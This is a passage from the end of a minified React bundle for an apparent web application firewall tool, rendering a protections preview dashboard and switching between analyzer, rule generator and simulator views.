19"})]})]})]},e.id))})]}),(0,i.jsxs)("section",{className:"dashboard-section",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),"WAF Protections Preview"]}),(0,i.jsx)("div",{className:"protection-grid",children:Object.entries(pt).slice(0,8).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"protection-card",children:[(0,i.jsxs)("div",{className:"protection-header",children:[(0,i.jsx)("span",{className:"protection-severity",style:{background:ht[n.severity].bg,color:ht[n.severity].color},children:n.severity}),(0,i.jsx)("span",{className:"protection-category",children:n.category})]}),(0,i.jsx)("h4",{children:n.name}),(0,i.jsx)("p",{children:n.description}),n.recommended&&(0,i.jsx)("span",{className:"protection-recommended",children:"\u2b50 Recommended"})]},t)})}),(0,i.jsxs)("button",{className:"btn btn-secondary view-all-btn",onClick:()=>t("analyzer"),children:["View All ",Object.keys(pt).length," Protections",(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("line",{x1:"5",y1:"12",x2:"19",y2:"12"}),(0,i.jsx)("polyline",{points:"12 5 19 12 12 19"})]})]})]})]})};const Vt=function(){const[e,t]=(0,r.useState)("dashboard"),[n,a]=(0,r.useState)([]);return(0,i.jsxs)("div",{className:"app",children:[(0,i.jsx)(s,{}),(0,i.jsxs)("div",{className:"app-container",children:[(0,i.jsx)(o,{activeView:e,onViewChange:t}),(0,i.jsx)("main",{className:"main-content",children:(()=>{switch(e){case"dashboard":default:return(0,i.jsx)(Ut,{onNavigate:t});case"analyzer":return(0,i.jsx)(Nt,{});case"generator":return(0,i.jsx)(Wt,{onRulesGenerated:a});case"simulator":return(0,i.jsx)(Ht,{rules:n})}})()})]})]})};a.createRoot(document.getElementById("root")).render((0,i.jsx)(r.StrictMode,{children:(0,i.jsx)(Vt,{})}))})();
//# sourceMappingURL=main.a4dfc5ce.js.map